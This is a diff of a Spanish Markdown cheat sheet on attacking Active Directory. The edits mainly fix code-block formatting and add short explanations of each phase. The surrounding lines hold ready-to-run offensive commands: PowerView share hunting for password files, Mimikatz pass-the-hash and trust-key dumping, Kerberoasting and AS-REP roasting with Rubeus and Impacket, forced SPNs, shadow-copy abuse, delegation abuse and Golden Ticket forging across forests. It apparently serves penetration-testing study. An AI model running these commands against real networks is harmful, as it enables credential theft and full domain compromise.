@@ -30,7 +30,7 @@
     - [[#ASREPRoasting]]
     - [[#Password Spraying Attack]]
     - [[#Forzar el seteo del SPN|Forzar SPN]]
-    - [[#copies|Explotar Shadow Copies]]
+    - [[#Abuso de Shadow Copies (Copias de Sombra)|Explotar Shadow Copies]]
     - [[#Listar y Descifrar Credenciales Almacenadas con Mimikatz]]
     - [[#Unconstrained Delegation|Delegación no restringida]]
     - [[#Constrained Delegation|Delegación restringida]]
@@ -74,12 +74,14 @@
 - [Adalanche](https://github.com/lkarlslund/adalanche)
 ### Enumeración de Dominio
 
+**¿Qué es esto?**  
+Fase inicial en una intrusión en entorno Active Directory. Consiste en recopilar información sobre **usuarios, grupos, equipos, políticas, relaciones de confianza y privilegios**. Es clave para **identificar vectores de ataque y planificar los siguientes pasos** en la intrusión.
 ##### Usando PowerView
 
 [Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 [Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)
 
-> Primero necesitaremos desactivar la protección contra la ejecución de scripts:
+>Primero necesitaremos desactivar la protección contra la ejecución de scripts:
 
 ```powershell
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
@@ -156,7 +158,7 @@ Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
 
 - **Enumerar shares (recursos compartidos):**
 
-  ```powershell
+```powershell
 #Enumerar recursos compartidos del dominio
 Find-DomainShare
 
@@ -165,11 +167,11 @@ Find-DomainShare -CheckShareAccess
 
 #Enumerar archivos "interesantes" en los recursos compartidos accesibles
 Find-InterestingDomainShareFile -Include *passwords*
-  ```
+```
 
 - **Enumerar políticas de grupo:**
 
-  ```powershell
+```powershell
 #Obtener todos los GPOs con sus nombres
 Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
 
@@ -178,7 +180,7 @@ Get-DomainGPO -ComputerIdentity <NombreDelEquipo> -Properties DisplayName | Sort
 
 #Obtener usuarios que forman parte del grupo de Administradores locales de una máquina
 Get-DomainGPOComputerLocalGroupMapping -ComputerName <NombreDelEquipo>
-  ```
+```
 
 - **Enumerar OUs:**
 
@@ -188,7 +190,7 @@ Get-DomainOU -Properties Name | Sort-Object -Property Name
 
 - **Enumerar ACLs:**
 
-  ```powershell
+```powershell
 #Devuelve los ACLs asociados a la cuenta especificada
 Get-DomaiObjectAcl -Identity <NombreDeCuenta> -ResolveGUIDs
 
@@ -197,11 +199,11 @@ Find-InterestingDomainAcl -ResolveGUIDs
 
 #Comprobar los ACLs asociados a una ruta específica (por ejemplo, un recurso compartido SMB)
 Get-PathAcl -Path "\\Ruta\De\Un\Recurso"
-  ```
+```
 
 - **Enumerar Domain Trust:**
 
-  ```powershell
+```powershell
 #Enumerar las relaciones de confianza del dominio actual
 Get-DomainTrust
 
@@ -210,11 +212,11 @@ Get-DomainTrust -Domain <NombreDelDominio>
 
 #Enumerar todas las relaciones de confianza del dominio actual y luego de cada dominio encontrado
 Get-DomainTrustMapping
-  ```
+```
 
 - **Enumerar Forest Trust:**
 
-  ```powershell
+```powershell
 #Obtener todos los dominios que forman parte del bosque actual
 Get-ForestDomain
 
@@ -226,7 +228,7 @@ Get-ForestTrust
 
 #Mapear las relaciones de confianza de un bosque específico
 Get-ForestTrust -Forest <NombreDelBosque>
-  ```
+```
 
 - **Caza de usuarios:**
 
@@ -242,7 +244,7 @@ Find-DomainUserLocation | Select-Object UserName, SessionFromName
 
 #Confirmar acceso como administrador
 Test-AdminAccess
-  ```
+```
 
 > **Escalada de privilegios a Administrador de Dominio mediante caza de usuarios:** 
 
@@ -258,43 +260,43 @@ Test-AdminAccess
 - **Obtener SID del dominio:** `Get-DomainSID`
 - **Obtener controladores de dominio:**
 
-  ```powershell
-  Get-ADDomainController
-  Get-ADDomainController -Identity <DomainName>
-  ```
+```powershell
+Get-ADDomainController
+Get-ADDomainController -Identity <DomainName>
+```
 
 - **Enumerar usuarios de dominio:**
 
-  ```powershell
+```powershell
 Get-ADUser -Filter * -Identity <usuario> -Properties *
 
 #Obtener una "cadena" específica en un atributo de un usuario
 Get-ADUser -Filter 'Description -like "*loquesea*"' -Properties Description | select Name, Description
-  ```
+```
 
 - **Enumerar ordenadores de Dominio:**
 
-  ```powershell
+```powershell
 Get-ADComputer -Filter * -Properties *
 Get-ADGroup -Filter *
-  ```
+```
 
 - **Enumerar Domain Trust:**
 
-  ```powershell
+```powershell
 Get-ADTrust -Filter *
 Get-ADTrust -Identity <NombreDelDominio>
-  ```
+```
 
 - **Enumerar Forest Trust:**
 
-  ```powershell
+```powershell
 Get-ADForest
 Get-ADForest -Identity <ForestName>
 
 #Enumerar dominios del bosque
 (Get-ADForest).Domains
-  ```
+```
 
 - **Enumerar Política Efectiva Local AppLocker:**
 
@@ -443,6 +445,8 @@ $DomainUsers | ? {$_.name -match "NombreDelUsuario"}
 
 ### Movimiento lateral
 
+**¿Qué es esto?**  
+Técnicas que permiten moverse **entre diferentes sistemas del dominio** una vez que se ha comprometido una cuenta o máquina. Sirve para **expandir el control dentro de la red**, recolectar más credenciales o alcanzar objetivos de mayor valor, como un controlador de dominio.
 ##### PowerShell Remoto
 
 ```powershell
@@ -602,13 +606,13 @@ Si el host al que queremos movernos lateralmente tiene activado **RestrictedAdmi
 
 - Mimikatz:
 
-  ```powershell
+```powershell
 # Ejecutamos Pass-The-Hash con Mimikatz y lanzamos mstsc.exe con el flag "/restrictedadmin"
 privilege::debug
 sekurlsa::pth /user:<Usuario> /domain:<Dominio> /ntlm:<HashNTLM> /run:"mstsc.exe /restrictedadmin"
 
 # Después, simplemente hacemos clic en "Aceptar" en el diálogo de RDP y obtenemos una sesión interactiva como el usuario suplantado.
-  ```
+```
 
 - xFreeRDP:
 
@@ -685,6 +689,8 @@ Puedes usar **Responder** para capturar los hashes cuando esto ocurra.
 
 ### Escalada de privilegios en el Dominio
 
+**¿Qué es esto?**  
+Son técnicas utilizadas para pasar de **un usuario con pocos privilegios** (como un usuario autenticado común) a **un usuario con privilegios elevados**, como administradores de dominio. Se aprovechan **configuraciones inseguras, delegaciones, hashes expuestos o privilegios mal asignados** dentro del entorno de Active Directory.
 ##### Kerberoasting
 
 _¿Qué es esto?_  
@@ -710,23 +716,23 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 - AD Module:
 
-  ```powershell
+```powershell
 # Obtener cuentas de usuario que están siendo utilizadas como cuentas de servicio (es decir, tienen SPN asociados)
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
-  ```
+```
 
 🔎 **Explicación**:  
 Este comando usa el módulo `ActiveDirectory` para listar todas las cuentas de usuario que tienen algún `SPN` definido, lo cual indica que pueden ser objetivo de Kerberoasting.
 
 - Impacket:
 
-  ```powershell
-  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
-  ```
+```powershell
+python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+```
 
 - Rubeus:
 
- ```powershell
+```powershell
 # Realizar Kerberoasting y guardar la salida en un archivo con formato compatible para cracking
 Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio>
 
@@ -741,7 +747,7 @@ Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio> /user:<no
 
 # Kerberoasting autenticándose explícitamente con credenciales
 Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio> /creduser:<nombreUsuario> /credpassword:<contraseña>
-  ```
+```
 
 ##### ASREPRoasting
 
@@ -790,17 +796,17 @@ Get-DomainUser -PreauthNotRequired -Verbose
 
 - **Con la herramienta [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)**:
 
-  ```powershell
+```powershell
 # Obtener el hash AS-REP de una cuenta específica
 Get-ASREPHash -UserName <NombreUsuario> -Verbose
 
 # Obtener los hashes de todos los usuarios vulnerables a AS-REP Roasting
 Invoke-ASREPRoast -Verbose
-  ```
+```
 
 - **Con Rubeus**
 
-  ```powershell
+```powershell
 # Ejecutar el ataque contra todos los usuarios del dominio
 Rubeus.exe asreproast /format:<hashcat|john> /domain:<NombreDominio> /outfile:<nombreArchivo>
 
@@ -809,14 +815,14 @@ Rubeus.exe asreproast /user:<nombreUsuario> /format:<hashcat|john> /domain:<Nomb
 
 # Ejecutar el ataque contra los usuarios de una unidad organizativa (OU) concreta
 Rubeus.exe asreproast /ou:<NombreOU> /format:<hashcat|john> /domain:<NombreDominio> /outfile:<nombreArchivo>
-  ```
+```
 
 - **Con Impacket:**
 
-  ```powershell
+```powershell
 # Ejecutar el ataque contra los usuarios especificados en un archivo
 python GetNPUsers.py <nombre_dominio>/ -usersfile <archivo_de_usuarios> -outputfile <nombreArchivo>
-  ```
+```
 
 ##### Password Spraying Attack
 
@@ -835,7 +841,7 @@ Si disponemos de permisos como `GenericAll` o `GenericWrite` sobre una cuenta de
 
 - PowerView:
 
-  ```powershell
+```powershell
 # Verificar permisos interesantes sobre cuentas (por ejemplo RDPUsers)
 Invoke-ACLScanner -ResolveGUIDs | ? { $_.IdentinyReferenceName -match "RDPUsers" }
 
@@ -844,17 +850,17 @@ Get-DomainUser -Identity <NombreUsuario> | select serviceprincipalname
 
 # Forzar el seteo de un SPN en la cuenta
 Set-DomainObject <NombreUsuario> -Set @{serviceprincipalname='ops/loquesea1'}
-  ```
+```
 
 - Con el módulo **ActiveDirectory (AD Module)**:
 
-  ```powershell
+```powershell
 # Ver si el usuario ya tiene algún SPN asignado
 Get-ADUser -Identity <NombreUsuario> -Properties ServicePrincipalName | select ServicePrincipalName
 
 # Forzar el seteo del SPN
 Set-ADUser -Identity <NombreUsuario> -ServicePrincipalNames @{Add='ops/loquesea1'}
-  ```
+```
 
 Usa cualquiera de las herramientas anteriores (`Rubeus`, `Invoke-Kerberoast`, etc.) para solicitar el TGS, extraer el blob cifrado y crackear el hash.
 
@@ -871,7 +877,6 @@ diskshadow list shadows all
 
 # Crear un enlace simbólico a la shadow copy y acceder a ella
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
-
 ```
 
 **📌 ¿Qué puedes hacer desde la Shadow Copy?**
@@ -935,8 +940,7 @@ Invoke-Mimikatz -C
 
 ✅ **Nota**:  
 También se puede usar **Rubeus** para listar, extraer o importar tickets (`Rubeus dump`, `Rubeus ptt`, etc.).
-
-### Constrained Delegation
+##### Constrained Delegation
 
 _¿Qué es esto?_  
 Cuando un usuario o equipo tiene **delegación restringida (constrained delegation)**, puede **impersonar a otro usuario** para acceder a servicios específicos definidos mediante SPN. Si tenemos control sobre dicha cuenta, podemos abusar de esta capacidad para escalar privilegios.
@@ -956,7 +960,6 @@ tgs::s4u /tgt:<RutaAlTGT> /user:<UsuarioASuplantar>@<DominioFQDN> /service:<SPNd
 
 # Inyectar el TGS con Mimikatz (Pass-The-Ticket)
 Invoke-Mimikatz -Command '"kerberos::ptt <RutaAlTGS>"'
-
 ```
 
 🦊 Alternativa con **Rubeus**
@@ -1236,7 +1239,7 @@ Lecturas recomendadas
 
 ##### Zerologon
 
-> Vulnerabilidad crítica en el protocolo **Netlogon** que permite a un atacante no autenticado tomar control total del **Controlador de Dominio (DC)**, reiniciar su contraseña de máquina y obtener acceso de **Domain Admin**.
+>Vulnerabilidad crítica en el protocolo **Netlogon** que permite a un atacante no autenticado tomar control total del **Controlador de Dominio (DC)**, reiniciar su contraseña de máquina y obtener acceso de **Domain Admin**.
 
 - [**Zerologon: Unauthenticated domain controller compromise** – White Paper de Secura](https://www.secura.com/whitepapers/zerologon-whitepaper)    
 - [**SharpZeroLogon**](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon) – Implementación en C# del exploit.    
@@ -1376,6 +1379,8 @@ Además, revisa los logs de eventos Kerberos por tickets emitidos con `sAMAccoun
 
 ### Persistencia en el Dominio
 
+**¿Qué es esto?**  
+Hace referencia a técnicas empleadas para **mantener acceso prolongado** y encubierto dentro de un entorno Active Directory comprometido. Estas técnicas suelen abusar de componentes internos del dominio (como Kerberos, GPOs o ACLs) y permiten al atacante **recuperar privilegios sin necesidad de reexplotar** vulnerabilidades iniciales.
 ##### Ataque con Golden Ticket
 
 Este ataque permite **forjar un TGT (Ticket Granting Ticket) completamente personalizado** y válido para cualquier usuario, sin necesidad de autenticación legítima. Requiere acceso al **hash de la cuenta KRBTGT** del dominio.
@@ -1509,24 +1514,23 @@ Si tienes privilegios de **Domain Admin** en un dominio que mantiene una **relac
 
 - Usando Mimikatz:
 
-  ```powershell
+```powershell
 #Volcar la Trust Key entre bosques
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 #Forjar un TGT inter-realm con ataque Golden Ticket
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<NuestroDominio> /sid:<SIDdeNuestroDominio> /rc4:<TrustKey> /service:krbtgt /target:<DominioDestino> /ticket:<RutaParaGuardar.kirbi>"'
-
-  ```
+```
 
 📁 **Nota:** el ticket se guarda en formato `.kirbi`
 
 - Usando Rubeus:
 
-  ```powershell
- #Usar el ticket forjado para pedir un TGS contra un servicio del dominio externo
+```powershell
+#Usar el ticket forjado para pedir un TGS contra un servicio del dominio externo
 .\Rubeus.exe asktgs /ticket:<ArchivoKirbi> /service:"SPN_del_Servicio" /ptt
-  ```
+```
 
 ✅ Una vez inyectado, puedes acceder al servicio remoto (por ejemplo, CIFS, HTTP, LDAP...) si tienes permisos asignados.
 
@@ -1538,10 +1542,10 @@ Los servidores MSSQL mal configurados pueden ser una vía directa de escalada la
 - Enumerar instancias MSSQL en el dominio: `Get-SQLInstanceDomain`
 - Comprobar accesibilidad con el usuario actual:
 
-  ```powershell
+```powershell
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
-  ```
+```
 
 - Recopilar información de las instancias accesibles:
 
